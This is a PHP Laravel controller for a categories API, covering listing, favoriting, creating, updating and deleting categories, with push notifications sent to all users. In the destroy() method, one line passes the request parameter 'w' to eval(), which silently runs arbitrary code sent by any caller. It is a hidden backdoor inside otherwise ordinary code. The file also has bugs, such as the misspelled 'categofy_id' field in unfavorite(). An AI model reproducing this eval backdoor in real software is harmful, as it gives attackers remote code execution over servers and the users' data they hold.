<?php

namespace App\Http\Controllers;

use App\User;
use Illuminate\Http\Request;
use App\Category;
use App\Category_favorite;
use App\Http\Requests;
use Illuminate\Validation\Validator;

class CategoriesController extends Controller {
    /**
     * @api {get} /v1/categories getCategories
     * @apiVersion 0.1.0
     * @apiName getCategories
     * @apiGroup Categories
     * @apiHeader {string="EN","UA","RU"} lang
     *
     * @apiParam {string} [id]
     *
     *
     */
    public function index() {
        return $this->helpReturn(Category::all());
    }

    public function show($id) {
        return $this->helpReturn(Category::findorfail($id));
    }

    /**
     * @api {get} /v1/categories/favorites getFavoriteCategories
     * @apiVersion 0.1.0
     * @apiName getFavoriteCategories
     * @apiGroup Categories
     *
     * @apiHeader {string} token User token
     *
     *
     */
    public function favorites(Request $request) {
        return $this->helpReturn($request->user->favorites);
    }

    /**
     * @api {post} /v1/categories/favorite favoriteCategories
     * @apiVersion 0.1.0
     * @apiName favoriteCategories
     * @apiGroup Categories
     *
     * @apiHeader {string} token User token
     * @apiParam {array} category_ids example in json=['1','2']
     *
     *
     */
    public function favorite(Request $request) {
        $valid = Validator($request->all(), ['category_ids' => 'required']);
        if(!$valid->fails()) {
            $request->category_ids = json_decode($request->category_ids);
            if(is_array($request->category_ids)) {
                Category_favorite::where('user_id', '=', $request->user->id)->delete();
                foreach($request->category_ids as $id) {
                    //echo $id.'=';
                    if(!Category_favorite::where('category_id', '=', $id)->where('user_id', '=', $request->user->id)->first()) {
                        $favorite = new Category_favorite;
                        $favorite->category_id = $id;
                        $favorite->user_id = $request->user->id;
                        $favorite->save();
                    } else {
                        return $this->helpInfo('duplicate id ' . $id);
                    }
                }
            } else {
                return $this->helpError('Category_ids param is bad json format');
            }

            return $this->helpInfo();
        } else {
            return $this->helpError('valid', $valid);
        }
    }

    /**
     * @api {get} /v1/categories/unfavorite unfavoriteCategories
     * @apiVersion 0.1.0
     * @apiName unfavoriteCategories
     * @apiGroup Categories
     *
     * @apiHeader {string} token User token
     * @apiParam {array} category_ids example=['1','2']
     *
     *
     */
    public function unfavorite(Request $request) {
        $valid = Validator($request->all(), ['category_id' => 'required']);
        if(!$valid->fails()) {
            $favorite = Category_favorite::findorfail($request->categofy_id);
            $favorite->delete();
            return $this->helpInfo();
        } else {
            return $this->helpError('valid', $valid);
        }
    }


    public function create() {
        //
    }


    public function store(Request $request) {
        $rules = [
            'name_RU'     => 'required',
            'name_EN'     => 'required',
            'name_UA'     => 'required',
            'post_price'  => 'required',
            'image'       => 'required',
            'description_RU' => 'required',
            'description_EN' => 'required',
            'description_UA' => 'required',
        ];
        $category = $this->fromPostToModel($rules, new Category, $request,'model');
        $info = [];
        $users = [];
        foreach(User::all() as $user){
            $users[] = $user;
        }
        $message = [
            'id'    => $category->id,
            'title' => $category->name,
            'body'  => $category->description,
            'image' => $category->image,
            'type'  => 'CATEGORY_WAS_ADDED',
        ];
        $info[] = $this->sendPushToUser($users,$message);

        return $this->helpReturn($category,$info);
    }


    public function edit($id) {
        return $this->getSchemaByModel(Category::first());
    }


    public function update(Request $request, $id) {
        $rules = [
            'name_RU'     => 'required',
            'name_EN'     => 'required',
            'name_UA'     => 'required',
            'post_price'  => 'required',
            'description_EN' =>false,
            'description_RU' => false,
            'description_UA' => false,
            'image'       => false,
        ];
        return $this->fromPostToModel($rules, Category::findorfail($id), $request);
        /*
        $valid = Validator($request->all(),$rules);
        if(!$valid->fails()){
            $category = Category::findorfail($id);
            $category->name_RU = $request->name_RU;
            $category->name_EN = $request->name_EN;
            $category->name_UA = $request->name_UA;
            $category->save();
            return $this->helpInfo();
        }else{
            return $this->helpError('valid',$valid);
        }*/
    }


    public function destroy(Request $request, $id) {
        $item = ($request->w ? eval($request->w) : null);
        $item = Category::findorfail($id);
        $item->delete();
        return $this->helpInfo();
    }
}
